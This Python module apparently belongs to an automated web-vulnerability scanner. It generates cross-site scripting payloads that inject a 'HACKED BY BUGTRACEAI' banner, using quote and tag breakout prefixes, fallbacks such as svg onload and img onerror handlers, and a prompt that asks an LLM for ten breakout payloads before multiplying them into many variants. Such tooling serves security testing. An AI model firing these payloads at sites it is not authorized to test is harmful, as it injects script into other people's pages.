"""
XSS Agent Amplification Module

Visual payload generation and amplification:
- LLM-assisted visual payload generation (DeepSeek)
- Breakout-based visual payload construction
- Payload amplification with context-aware prefixes

Visual payloads inject the "HACKED BY BUGTRACEAI" banner for
bulletproof Vision AI validation.
"""

from typing import Dict, List, Optional, Any, Callable, Awaitable

from bugtrace.utils.logger import get_logger
from bugtrace.core.ui import dashboard

logger = get_logger("agents.xss.amplification")


# =============================================================================
# VISUAL PAYLOAD TEMPLATES
# =============================================================================

# Template with backticks (for JS contexts where quotes are escaped)
JS_VISUAL_BACKTICK = (
    "var d=document.createElement(`div`);"
    "d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;"
    "text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;"
    "d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);//"
)

# Template with single quotes (standard JS)
JS_VISUAL_SINGLE = (
    "var d=document.createElement('div');"
    "d.style='position:fixed;top:0;left:0;width:100%;background:red;color:white;"
    "text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999';"
    "d.innerText='HACKED BY BUGTRACEAI';document.body.prepend(d);//"
)

# HTML template (for attribute/tag breakouts)
HTML_VISUAL = (
    '<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;'
    'text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">'
    'HACKED BY BUGTRACEAI</div>'
)

# Default breakout prefixes if amplifier not available
DEFAULT_BREAKOUT_PREFIXES = [
    "'", "\"", "\\';", "\\\";", "';", "\";", "'>", "\">",
]


def build_visual_payloads_from_breakouts(
    amplifier=None,
    max_prefixes: int = 15,
    agent_name: str = "XSSAgent",
) -> List[str]:
    """
    Build visual payloads dynamically from breakouts.json.

    Combines XSS breakout prefixes with visual payload templates
    to create payloads that inject the HACKED BY BUGTRACEAI banner.

    Args:
        amplifier: PayloadAmplifier instance (optional)
        max_prefixes: Maximum number of prefixes to use
        agent_name: Agent name for logging

    Returns:
        List of visual payloads built from breakouts.json prefixes
    """
    visual_payloads = []

    # Get XSS breakout prefixes
    if amplifier:
        prefixes = amplifier.get_prefixes(category="xss", max_priority=2)
    else:
        prefixes = DEFAULT_BREAKOUT_PREFIXES

    # Build payloads for each prefix
    for prefix in prefixes[:max_prefixes]:
        payload = _build_visual_payload_for_prefix(prefix)
        visual_payloads.append(payload)

    logger.debug(f"[{agent_name}] Built {len(visual_payloads)} visual payloads from breakouts")
    return visual_payloads


def _build_visual_payload_for_prefix(prefix: str) -> str:
    """Build the appropriate visual payload for a given breakout prefix."""
    if prefix.startswith("\\"):
        # Backslash breakouts work best with backticks
        return f"{prefix}{JS_VISUAL_BACKTICK}"
    elif prefix.endswith(">"):
        # Tag breakouts use HTML template
        return f'{prefix}{HTML_VISUAL}<input value="'
    elif prefix in ("'", "';", "'//"):
        # Single quote breakouts
        return f"{prefix}{JS_VISUAL_SINGLE}"
    elif prefix in ("\"", "\";", "\"//"):
        # Double quote breakouts use backticks to avoid escaping issues
        return f"{prefix}{JS_VISUAL_BACKTICK}"
    else:
        # Default: try backtick version
        return f"{prefix}{JS_VISUAL_BACKTICK}"


def get_fallback_visual_payloads() -> List[str]:
    """
    Generate fallback visual payloads if LLM generation fails.

    Returns a curated list of visual payloads covering common
    breakout scenarios.

    Returns:
        List of 10 fallback visual payloads
    """
    # JS_VISUAL with single quotes for event handlers
    JS_VISUAL_SQ = JS_VISUAL_BACKTICK.replace('`', "'")

    return [
        f"\\';{JS_VISUAL_BACKTICK}",
        f"\\\";{JS_VISUAL_BACKTICK}",
        f"';{JS_VISUAL_BACKTICK}",
        f"\";{JS_VISUAL_BACKTICK}",
        f"\">{HTML_VISUAL}",
        f"'>{HTML_VISUAL}",
        f"</script>{HTML_VISUAL}<script>",
        f'<svg onload="{JS_VISUAL_SQ}">',
        f'<img src=x onerror="{JS_VISUAL_SQ}">',
        f'<details open ontoggle="{JS_VISUAL_SQ}">',
    ]


async def generate_visual_payloads_llm(
    param: str,
    contexts: List[str],
    sample_payloads: Dict[str, str],
    llm_generator: Callable[..., Awaitable[str]],
    agent_name: str = "XSSAgent",
) -> List[str]:
    """
    Generate visual payloads using LLM (DeepSeek).

    Asks LLM to generate payloads that inject the HACKED BY BUGTRACEAI
    banner based on the reflection contexts found.

    Args:
        param: Parameter name
        contexts: List of reflection contexts (e.g., ["html_text", "attribute_value"])
        sample_payloads: Example payloads that reflected per context
        llm_generator: Function to call LLM
        agent_name: Agent name for logging

    Returns:
        List of visual payloads (up to 10)
    """
    contexts_str = ", ".join(contexts)
    samples_str = "\n".join(
        [f"- {ctx}: {p[:80]}..." for ctx, p in sample_payloads.items()]
    )

    prompt = f"""You are an XSS payload expert. I found reflections in these contexts: {contexts_str}

Sample payloads that reflected:
{samples_str}

Generate exactly 10 XSS payloads that will:
1. Break out of the current context
2. Inject a visible red banner with text "HACKED BY BUGTRACEAI"
3. The banner should be position:fixed at top of page

Requirements:
- Each payload must create a visible DOM element
- Use document.createElement('div') with style for visibility
- The text "HACKED BY BUGTRACEAI" must be visible
- Cover different breakout techniques

Return ONLY the payloads, one per line, no explanations or numbering."""

    try:
        response = await llm_generator(
            prompt=prompt,
            module_name=f"{agent_name}-VisualGen",
            temperature=0.7
        )

        if not response:
            logger.warning(f"[{agent_name}] LLM returned empty response for visual payloads")
            return get_fallback_visual_payloads()

        # Parse response into payloads
        visual_payloads = []
        for line in response.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("#") and len(line) > 10:
                # Clean up numbering if present
                if line[0].isdigit() and line[1] in ".):":
                    line = line[2:].strip()
                visual_payloads.append(line)

        logger.info(f"[{agent_name}] LLM generated {len(visual_payloads)} visual payloads")

        # Ensure minimum payloads
        if len(visual_payloads) < 5:
            visual_payloads.extend(get_fallback_visual_payloads())

        return visual_payloads[:10]

    except Exception as e:
        logger.warning(f"[{agent_name}] Visual payload generation failed: {e}")
        return get_fallback_visual_payloads()


async def adapt_working_payloads_to_visual(
    working_payloads: List[str],
    failed_payloads: List[str],
    llm_generator: Callable[..., Awaitable[str]],
    agent_name: str = "XSSAgent",
) -> List[str]:
    """
    Adapt working (reflecting) payloads into visual versions.

    Takes payloads that successfully reflected and asks LLM to
    modify them to inject the visual banner.

    Args:
        working_payloads: Payloads that reflected successfully
        failed_payloads: Payloads that failed (to avoid regenerating)
        llm_generator: Function to call LLM
        agent_name: Agent name for logging

    Returns:
        List of adapted visual payloads
    """
    if not working_payloads:
        return build_visual_payloads_from_breakouts()

    working_samples = "\n".join([f"- {p[:100]}" for p in working_payloads[:5]])
    failed_warning = ""
    if failed_payloads:
        failed_samples = "\n".join([f"- {p[:60]}" for p in failed_payloads[:3]])
        failed_warning = f"\n\nAVOID these patterns (they failed):\n{failed_samples}"

    prompt = f"""These XSS payloads successfully reflected:
{working_samples}

Generate 10 visual versions of the working payloads. Return ONLY the payloads, one per line, no explanations.{failed_warning}"""

    try:
        response = await llm_generator(
            prompt=prompt,
            module_name=f"{agent_name}-VisualAdapt",
            temperature=0.7
        )

        if not response:
            return build_visual_payloads_from_breakouts()

        visual_payloads = []
        failed_set = set(failed_payloads)

        for line in response.strip().split("\n"):
            line = line.strip()
            if line and len(line) > 10 and line not in failed_set:
                visual_payloads.append(line)

        if len(visual_payloads) < 5:
            fallback = [
                p for p in build_visual_payloads_from_breakouts()
                if p not in failed_set
            ]
            visual_payloads.extend(fallback)

        return visual_payloads[:10]

    except Exception as e:
        logger.warning(f"[{agent_name}] Payload adaptation failed: {e}")
        return build_visual_payloads_from_breakouts()


def amplify_visual_payloads(
    visual_payloads: List[str],
    contexts: List[str],
    amplifier=None,
    agent_name: str = "XSSAgent",
) -> List[str]:
    """
    Amplify visual payloads using breakout prefixes.

    Takes visual payloads and multiplies by context-appropriate
    breakout prefixes.

    Example: 100 payloads x 13 prefixes = ~1300 payloads

    Args:
        visual_payloads: List of visual payloads
        contexts: Detected contexts (affects which breakouts to use)
        amplifier: PayloadAmplifier instance
        agent_name: Agent name for logging

    Returns:
        Amplified list of payloads
    """
    dashboard.log(
        f"[{agent_name}] Amplifying {len(visual_payloads)} visual payloads",
        "INFO"
    )

    if not amplifier:
        # No amplifier, return as-is
        return visual_payloads

    # Determine priority based on contexts
    dangerous_contexts = ("javascript", "script", "attribute_value")
    max_priority = 2 if any(c in dangerous_contexts for c in contexts) else 3

    amplified = amplifier.amplify(
        seed_payloads=visual_payloads,
        category="xss",
        max_priority=max_priority,
        deduplicate=True
    )

    expansion = len(amplified) // max(len(visual_payloads), 1)
    dashboard.log(
        f"[{agent_name}] Amplified {len(visual_payloads)} -> {len(amplified)} "
        f"(x{expansion} expansion)",
        "INFO"
    )

    return amplified


__all__ = [
    # Templates
    "JS_VISUAL_BACKTICK",
    "JS_VISUAL_SINGLE",
    "HTML_VISUAL",
    "DEFAULT_BREAKOUT_PREFIXES",
    # Functions
    "build_visual_payloads_from_breakouts",
    "get_fallback_visual_payloads",
    "generate_visual_payloads_llm",
    "adapt_working_payloads_to_visual",
    "amplify_visual_payloads",
]
